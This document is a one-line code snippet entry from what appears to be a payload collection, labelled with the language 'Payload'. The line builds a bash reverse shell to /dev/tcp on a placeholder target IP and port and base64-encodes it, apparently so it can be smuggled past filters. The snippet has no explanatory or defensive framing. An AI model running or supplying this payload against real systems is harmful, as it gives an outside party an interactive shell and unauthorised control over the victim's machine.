---
id: 4dadbf52-f6d9-4e13-bc6d-f2ccf1e11094
type: code
language: Payload
verified: false
created_at: '2020-03-12T21:26:26.273118+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 4dadbf52

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```
